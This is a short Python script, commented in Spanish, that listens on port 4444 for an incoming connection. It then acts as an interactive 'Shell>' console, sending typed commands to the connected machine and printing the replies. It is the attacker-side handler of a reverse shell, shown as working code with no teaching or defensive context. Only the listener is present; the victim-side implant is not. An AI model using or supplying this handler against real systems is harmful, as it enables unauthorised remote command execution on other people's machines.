import socket

# Configuración
IP_SERVIDOR = "0.0.0.0"
PUERTO = 4444

# Crear socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP_SERVIDOR, PUERTO))
s.listen(1)

print(f"Esperando conexión en {PUERTO}...")

# Aceptar conexión
cliente, addr = s.accept()
print(f"Conexión recibida de {addr}")

while True:
    comando = input("Shell> ")
    if comando.lower() == "exit":
        break

    cliente.send(comando.encode())
    respuesta = cliente.recv(4096).decode()
    print(respuesta)

cliente.close()
s.close()
